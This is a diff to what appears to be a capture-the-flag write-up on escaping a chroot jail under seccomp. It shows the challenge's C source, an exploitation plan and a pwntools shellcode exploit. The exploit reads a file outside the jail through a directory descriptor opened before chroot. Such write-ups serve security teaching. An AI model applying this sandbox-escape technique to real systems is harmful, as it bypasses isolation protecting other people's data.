@@ -15,68 +15,65 @@
 == Challenge Source Code
 
 ```c
-#define _GNU_SOURCE 1
-
-#include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <time.h>
-#include <errno.h>
 #include <assert.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/socket.h>
-#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <sys/mman.h>
 #include <sys/sendfile.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
 #include <seccomp.h>
 
-int main(int argc, char **argv, char **envp)
-{
-    assert(argc > 0);
+int main(int argc, char **argv, char **envp) {
+  assert(argc > 0);
 
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 1);
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 1);
 
-    assert(argc > 1);
+  assert(argc > 1);
 
-    // Checking to make sure you're not trying to open the flag.
-    assert(strstr(argv[1], "flag") == NULL);
+  // Checking to make sure you're not trying to open the flag.
+  assert(strstr(argv[1], "flag") == NULL);
 
-    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);
 
-    char jail_path[] = "/tmp/jail-XXXXXX";
-    assert(mkdtemp(jail_path) != NULL);
+  char jail_path[] = "/tmp/jail-XXXXXX";
+  assert(mkdtemp(jail_path) != NULL);
 
-    assert(chroot(jail_path) == 0);
+  assert(chroot(jail_path) == 0);
 
-    assert(chdir("/") == 0);
+  assert(chdir("/") == 0);
 
-    int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "try harder", 10);
-    close(fffd);
+  int fffd = open("/flag", O_WRONLY | O_CREAT);
+  write(fffd, "try harder", 10);
+  close(fffd);
 
-    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
-    assert(shellcode == (void *)0x1337000);
+  void *shellcode =
+      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
+           MAP_PRIVATE | MAP_ANON, 0, 0);
+  assert(shellcode == (void *)0x1337000);
 
-    int shellcode_size = read(0, shellcode, 0x1000);
+  int shellcode_size = read(0, shellcode, 0x1000);
 
-    scmp_filter_ctx ctx;
+  scmp_filter_ctx ctx;
 
-    ctx = seccomp_init(SCMP_ACT_KILL);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
-    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);
+  ctx = seccomp_init(SCMP_ACT_KILL);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
+  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);
 
-    assert(seccomp_load(ctx) == 0);
+  assert(seccomp_load(ctx) == 0);
 
-    ((void(*)())shellcode)();
+  ((void (*)())shellcode)();
 }
 ```
 
@@ -93,11 +90,13 @@ While this prevents us from passing `/flag` directly, it does *not* prevent us f
 
 == Exploitation Plan
 
-1.  *Leak the Root FD:* Execute the binary with `/` as the argument. The string check passes (since "/" doesn't contain "flag"), and we get a handle to the real root directory.
-2.  *Bypass Checks:* Use the `openat` syscall within our shellcode. We use the leaked FD (3) as the starting directory and `"flag"` as the relative path.
-3.  *Retrieve Flag:* Read the file content and write it to stdout using `sendfile`.
+1. *Leak the Root FD:* Execute the binary with `/` as the argument. The string check passes (since "/" doesn't contain "flag"), and we get a handle to the real root directory.
+2. *Bypass Checks:* Use the `openat` syscall within our shellcode. We use the leaked FD (3) as the starting directory and `"flag"` as the relative path.
+3. *Retrieve Flag:* Read the file content and write it to stdout using `sendfile`.
 
 == Exploit Script
+
+The following script uses `shellcraft` to generate the payload. Since the `exit` system call is blocked by seccomp, we end the shellcode with an infinite loop (`jmp .`) to prevent the process from being killed immediately, allowing us to read the output from stdout.
 
 ```python
 from pwn import *
@@ -105,34 +104,26 @@ from pwn import *
 exe = "./challenge"
 context.binary = exe
 
-# Pass '/' to bypass the string check and leak the root FD
+# Pass '/' to leak the root FD (fd 3)
 p = process([exe, "/"])
 
-shellcode = asm("""
-    /* openat(3, "flag", O_RDONLY) */
-    mov rdi, 3              /* dirfd: 3 */
-    lea rsi, [rip + flag]   /* pathname: "flag" */
-    xor rdx, rdx            /* flags: O_RDONLY */
-    mov rax, 257            /* syscall: SYS_openat */
-    syscall
+# Construct shellcode using shellcraft
+# 1. openat(3, "flag", O_RDONLY)
+sc = shellcraft.openat(3, "flag", constants.O_RDONLY)
 
-    /* sendfile(1, fd, 0, 100) */
-    mov rsi, rax            /* in_fd */
-    mov rdi, 1              /* out_fd */
-    xor rdx, rdx            /* offset */
-    mov r10, 100            /* count */
-    mov rax, 40             /* syscall: SYS_sendfile */
-    syscall
+# 2. sendfile(1, fd, 0, 100)
+# 'rax' contains the file descriptor returned by openat
+sc += shellcraft.sendfile(1, 'rax', 0, 100)
 
-    /* exit(0) */
-    mov rax, 60
-    xor rdi, rdi
-    syscall
+# 3. infinite loop (exit is blocked by seccomp)
+sc += "jmp ."
 
-flag:
-    .string "flag"
-""")
-
+# Assemble and send
+shellcode = asm(sc)
 p.send(shellcode)
-p.interactive()
+
+# Read output with timeout
+print(p.recvall(timeout=1).decode())
+
+p.close()
 ```
